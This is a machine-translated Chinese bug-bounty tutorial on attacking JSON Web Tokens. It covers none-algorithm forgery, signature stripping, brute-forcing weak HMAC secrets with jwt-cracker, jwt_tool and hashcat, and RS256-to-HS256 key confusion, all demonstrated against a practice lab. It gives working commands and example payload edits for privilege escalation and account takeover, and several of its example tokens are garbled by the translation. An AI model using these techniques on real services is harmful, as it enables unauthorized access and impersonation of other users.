# 对 JSON Web 令牌的攻击(JWT)

> 原文：<https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e?source=collection_archive---------0----------------------->

在文章的[第 1 部分，我介绍了 JSON web 令牌，即**什么是 JWT 以及它们是如何制造的？在你阅读这篇文章之前，我更愿意先看一看。**](https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce)

所以伙计们，在这篇文章中，我们将讨论 JWT 上的攻击部分，这是*黑客最喜欢的部分😁。所以系紧你的安全带，因为这篇文章会很长*

![](img/ea2d6e83d8707aa311cd068a1a220734.png)

这些是我们将在这篇文章中学习的攻击:

*   滥用 None 算法
*   签名剥离
*   破解脆弱的共享秘密
*   替代攻击

*开始吧！！！*

*   ***滥用无算法:***

*假设没有使用任何算法来生成 JWToken。在这种情况下，任何人都可以创建一个伪造的 JWT 令牌并将其提交给资源服务器，因为令牌中没有可用的签名，并且资源服务器无法进一步验证有效负载是否被修改。虽然这种攻击在安全评估中并不常见，但理解其工作原理是很重要的。这一知识在执行其他类型的攻击时会很有帮助，例如签名剥离。*

> *假设你有这个令牌*
> 
> *eyj 0 exaioijkv 1 qilcjhbgcioijub 25 Lin 0 . eyjpyxqioiaxmjm 0 nty 3 odkxlcjpc 3 mioiaiibg 9 jywhvc 3 qilchlehaiojg 1 NDU 2 mtizntqsinvzzxjzci 6 imfudwjoyxyilcjpc 0 fkbwluijoizmfsc 2 uifq。*

*所以当我们解码这个 JWToken 的有效载荷部分时。*

*![](img/0b19c049c4001848c8c96322548c5dba.png)*

*https://[www.base64url.com/](https://www.base64url.com/)*

> *解码令牌*
> 
> *{"typ":"JWT "，" alg ":"无" }。{"iat": 1234567891，" iss": "locahost "，" exp":8545612354，" userId":"anubhav "，" **isAdmin":"false"** }。*

*正如你所看到的，这个令牌使用了 none 算法，你也可以看到 **isAdmin** 值为 **false** 。所以在 none 算法中，你可以直接改变任何值，它会被服务器验证，因为这里没有像签名这样的东西，服务器可以交叉检查。所以这里我们要把 **isAdmin** 的值改成 **true。***

*![](img/f4dbd537097770ce1f6d050e66dc963a.png)*

*https://[www.base64url.com/](https://www.base64url.com/)*

> *修改的令牌*
> 
> *{"typ":"JWT "，" alg ":"无" }。{"iat": 1234567891，" iss": "locahost "，" exp":8545612354，" userId":"anubhav "，" **isAdmin":"true"** }。*
> 
> *eyj 0 exaioijkv 1 qilcjhbgcioijub 25 Lin 0 . eyjpyxqioiaxmjm 0 nty 3 odkxlcjpc 3 mioiaiibg 9 jywhvc 3 qilchlehaiojg 1 NDU 2 mtizntqsinvzzxjzci 6 imfudwjoyxyilcjpc 0 fkbwluijoidhj 1 zsj 9。*

*在这种情况下，当您向服务器提交这个令牌时，您将以**管理员的身份登录。** *这就是你如何从普通用户到管理员用户进行垂直权限升级。**

*您还可以通过将名称从`anubhav`更改为在该网站上注册的任何其他用户(假设为`vaibhav`)来进行横向权限提升。*

> ***解码令牌***
> 
> *{"typ":"JWT "，" alg ":"无" }。{"iat": 1234567891，" iss": "locahost "，" exp":8545612354，" userId":" **anubhav** ，" isAdmin":"false"}。*
> 
> ***修改令牌***
> 
> *{"typ":"JWT "，" alg ":"无" }。{"iat": 1234567891，" iss": "locahost "，" exp":8545612354，" userId":" **vaibhav** ，" isAdmin":"false"}。*
> 
> ***编码后的最终 jw token***
> 
> *eyj 0 exaioijkv 1 qilcjhbgcioijub 25 Lin 0 . eyjpyxqioiaxmjm 0 nty 3 odkxlcjpc 3 mioiaiibg 9 jywhvc 3 qilchlehaiojg 1 NDU 2 mtizntqsinvzzxjzci 6 inzhawjoyxyilcjpc 0 fkbwluijoizmfsc 2 uifq。*

*这是你接管他人账户的方式🙃。这只是一个需要理解的例子，在现实生活中，您必须自己检查您必须修改什么值才能得到升级。所以这都是关于无算法的。*

*   ***特征码剥离攻击***

*为了演示这种攻击，我们将使用名为 [jwtdemo](https://github.com/Sjord/jwtdemo) 的实验室。*

*这是实验室 HS256 的演示页面。*

*![](img/ddcaad53e591ddc21498a97815611222.png)*

*所以让我们来解码这个来自 [jwt.io](http://jwt.io) 的令牌*

*![](img/76ccaacaedfeb3ed37b96c8524777e4f.png)*

*现在我们要将算法从 HS256 更改为 none，如果服务器验证了我们修改后的令牌请求，那么我们的攻击就成功了。*

*所以要改变算法有两种方法:*

*   *用手*
*   *自动使用名为 [jwt_tool](https://github.com/ticarpi/jwt_tool) 的刀具。*

*因此，我将为您讨论这两种方法😌*

*让我们开始吧……*

1.  ***手动***

*让我们检查一下我们现在要滥用的服务器最初生成的 JWToken。*

*![](img/4024aaa39712d2aab373ac36d7d256f8.png)*

*关于服务器给出的原始令牌的所有信息*

*如你所见，这里的算法是 HS256。*

*现在复制令牌的报头部分并粘贴到[base64url.com](https://www.base64url.com/)上*

*![](img/8854b5cb1f0572fb91f8f61f2f558f29.png)*

*这里您可以看到使用的算法是 HS256，因此我们必须将其更改为 none。*

*![](img/24c0a5583ec0c48b90a115b2e8e1ea10.png)*

*全部完成后，我们改变了算法。现在，我们只需使用头部和有效载荷部分进行认证。*

*记住伙计们，我们在有效载荷部分没有做任何改动，因为我们现在不想要它了，但是你们可以根据自己的情况进行改动，进行权限升级。*

> *这是修改后的令牌…*
> 
> *eyjhbgcioijub 25 liiwidhlwijoislduin 0 . ey jpc 3 mioijodhrwwolwxc 9 kzw 1 vlnnqb 2 vyzgxhbmdrzw 1 wzxiubxclysimlhdci 6 mtyynzq 4 ntm 4 oswizzhwijoxnji 3n DG 2 ntg 5 lcjkyxrhijp 7 imhlbgxvijoid 29 ybgqifx 0 .*
> 
> ***你可以看到我们删除了签名部分，因为在 none 算法中我们不需要签名:)***

*现在，我们发送修改后的令牌来检查这个令牌是否得到服务器的验证。*

*![](img/fb4a8bda42273ddc2e758c2008def4ab.png)*

*修改的令牌*

*如您所见，我们修改后的令牌得到了验证…*

*![](img/00260aa6a5511464d4c33e7e3563f806.png)*

*这就是我们如何成功地手动执行**签名剥离攻击。***

***2。自动用工具命名为**[**【jwt _ tool】**](https://github.com/ticarpi/jwt_tool)**。***

*有关该工具的更多信息，请参考 intigrity 的这篇文章:-[https://blog . intigriti . com/2021/07/27/hacker-tools-jwt _ tool/](https://blog.intigriti.com/2021/07/27/hacker-tools-jwt_tool/)*

*用法:-要将算法更改为 none，请使用-X 标志*

> *`python3 jwt_tool.py <your token> -X a`*

*![](img/1f716c6921f4808bb8906a41bb2db353.png)*

*您可以看到我们的令牌已生成，您可以使用它进行攻击，就像我们在上面执行的操作一样。*

*所以基本上，我们只是改变了这里的算法来摆脱签名验证，但是这种攻击只有在框架支持 none 类型算法时才起作用。这只是一个便于理解的示例，在真实的场景中，您必须自己检查需要修改什么值才能获得升级。*

*   ***破解脆弱的共享秘密***

*如果令牌使用任何脆弱的秘密字符串进行加密，那么我们可以尝试暴力破解它，或者执行字典攻击。*

1.  ***暴力破解**密钥，为此我们有一个名为 [jwt-cracker](https://github.com/lmammino/jwt-cracker) 的工具。*

> *用法:`jwt-cracker <token> [alphabet] [<maxlength>]`*

*示例:*

*![](img/f92c61eebc25858d2c994534014474ee.png)*

> *秘密被发现: *123456* ，所以我们可以用这个秘密来生成令牌的签名*

```
**Generate signature with the help of secret key...***Usage :**
echo -n "<header>.<payload>" | openssl dgst -sha256 -hmac '<secret key>' -binary | openssl base64 -e -A | sed 's/\+/-/g' | sed 's/\//_/g' | sed -E s/=+$// **Example:**
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | openssl dgst -sha256 -hmac '123456' -binary| openssl base64 -e -A | sed 's/\+/-/g' | sed 's/\//_/g' | sed -E s/=+$//**output** **:- keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU**This is how we are able to generate signature ...*
```

***2。**执行**字典攻击**以获得密钥。*

*我们可以用之前用过的名为`jwt_tool.py`的工具进行攻击*

*用法:*

*`python3 jwt_tool.py <JWToken> -C -d secrets.txt`*

```
***secrets.txt** contains the list of possible secrets..❯ cat secrets.txt
654321
456789
741258
963258
744569
123478
123456
789654
159632
753148*
```

*示例:*

*![](img/3a25da5ce1ac03bbf30107c6c45e6e5f.png)*

*你可以看到这个秘密密钥被这个`123456`攻击破解了，所以我们可以用这个秘密来生成 JWT 令牌，就像我上面展示的那样。*

*您也可以使用 hashcat，因为 Hashcat 运行速度更快，如果您启用了 GPU 功能，这是 Hashcat 的一个额外优势。*

```
*Command:

[echo](https://www.linkedin.com/feed/hashtag/?keywords=echo) jwt_token > JWT_file

[hashcat](https://www.linkedin.com/feed/hashtag/?keywords=hashcat) -a 0 -m 16500 /path_to_JWT_file/JWT_file  /path_to_dictionary_file --force

m - (hash module)
16500 - (hash module identified by number for JWT)*
```

*   ***换人攻击***

*在这次攻击中，我们迷惑服务器使用一种算法而不是另一种算法。所以这里我们要把算法从 *RS256* 改成 *HS256* …*

*正如我在我的[上一篇文章](https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce)中解释的，RS256 算法需要一个私钥来篡改数据，还需要一个对应的公钥来验证签名的真实性。但是，如果我们能够将签名算法从 RS256 更改为 HS256，我们就可以混淆服务器使用一种算法而不是另一种算法。我们将强制应用程序只使用一个键来完成两个任务，这是 HMAC 算法的正常行为。*

*![](img/815b8ac3954251ec11261d6b2afa333f.png)*

*这是服务器给出的 RS256 签名令牌*

*所以这里我们要把算法从 *RS256 改成 HS256* 。因此，通过这种方式，工作流将从非对称加密转换为对称加密，我们可以使用相同的公钥对新令牌进行签名。*

*因为这是一个公钥，所以这个密钥必须保持公开。因此，您可以自己在互联网上找到它，或者另一个潜在的来源是服务器的 TLS 证书，该证书可能会在 JWT 操作中重复使用:*

*命令:*

```
*openssl s_client -connect <hostname>:443*
```

*通过运行以下命令，将“服务器证书”输出复制到一个文件(例如 *cert.pem* )中，并提取公钥(到一个名为 *key.pem* 的文件中):*

```
*openssl x509 -in cert.pem -pubkey -noout > key.pem*
```

*这就是你如何公开任何主机的. PEM…*

*至于这个实验室，公钥是提供给我们的。*

*![](img/f677bc351337eb2e3252bc1cf782265e.png)*

*将该公钥保存在名为 public.pem 的文件中*

*为了改变算法，我们将再次使用名为 [jwt_tool](https://github.com/ticarpi/jwt_tool) 的相同工具。*

*首先，我们将了解应用程序在给定的 RS256 签名令牌下的行为。*

*![](img/b4791c355f15b5fa963830b6c34694af.png)*

*派 JWT 去验证令牌*

*![](img/a3a3d59c0882218c798f16228e5e46c5.png)*

*您可以看到服务器验证了令牌*

*所以让我们开始用工具改变算法。*

*带有示例的命令:*

*   *要改变算法，我们可以使用这个命令*

> *`python3 jwt_tool.py <JWT TOKEN> -S hs256 -k public.pem`*

*示例:*

*![](img/e2b6dbec6cab6f1a8b35278878954cbb.png)*

```
*We got HS256 Signed token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYyNzU2MTk4OCwiZXhwIjoxNjI3NTYzMTg4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.OFYOhR0sW37RdC9XBbEVR2Tao0hymeCbYc0IpiTwvVg*
```

*让我们看看这个令牌是否被完美地签名了🤔*

*![](img/7724518cd19b5290270fd0efd27aedb6.png)*

*我们将发送这个令牌来验证它。*

*![](img/0ccd163ad11337e1760df935a354b0b6.png)*

*如您所见，我们的 HS256 签名令牌得到了服务器的验证。所以你在想，如果它被服务器验证了，我会怎么做🤔？？？？我在这里有什么好处？？🙄*

*如果你可以自己创建一个令牌，那么你也可以修改这个令牌，我想你明白了😌(Samaj daar ki eshara kafhi hai)。我将向你展示一些场景，以便你能很好地理解它们。*

*示例:*

```
*Suppose in payloads there are fields which we are can modify."admin": "false" ======> "admin": "true"
"user": "normal" ======> "user": "administrator"
"name": "Anubhav Singh" ======> "name": "Vaibhav Singh"
"email": "hacker@gmail.com" ======> "email": "victim@gmail.com"This how we can modify the values...*
```

*因此，您知道可以在有效负载中修改哪些内容来获得权限提升。但是你将如何修改这个有效载荷呢？？？有各种各样的方法，但是对于本文，我只是使用同一个工具( [jwt_tool](https://github.com/ticarpi/jwt_tool) )来修改有效载荷和创建令牌。*

> *在这种情况下，我们必须篡改令牌，修改有效载荷，还必须更改算法。*

*命令:*

> *`python3 jwt_tool.py <JWT TOKEN> -S hs256 -k public.pem -T`*

*步骤:*

*我为你们制作了一个视频来演示如何修改 JSON WEB TOKEN 来完成这次攻击。*

*我希望你们已经理解了如何根据需要修改令牌，也就是说，我已经向你们展示了修改值或者在令牌的有效载荷部分添加任何键-值对的方法，最后，算法变成了 HS256。*

*![](img/d19b81de59dc621883fd82df65055e6b.png)*

*修改的令牌*

*现在我们已经得到了修改后的令牌。让我们看看这是否得到了服务器的验证🤔。*

*![](img/4a349a3aab8b7d229db7acaf829828a9.png)*

*发送令牌进行检查*

*![](img/f0c93883c75b86c0cae8dd87f94c1dea.png)*

> **你可以看到服务器*验证了我们修改后的令牌😌。*

# *结束语*

*JWT 系列攻击 JWTokens 的第二部分到此结束。我希望你们都从这篇文章中学到了一些东西。这个系列还会有下一部分。谢谢你一直读到最后😄*

*如果你觉得这篇文章有帮助，请给我反馈，你可以在 Twitter @AnubhavSingh 上找到我*

*猎虫快乐！👊🔥*

# *🔈 🔈Infosec Writeups 正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有 16 个令人难以置信的演讲者和 10 多个小时充满力量的讨论会议。[查看更多详情并在此注册。](https://iwcon.live/)*

*[](https://iwcon.live/) [## IWCon2022 - Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)*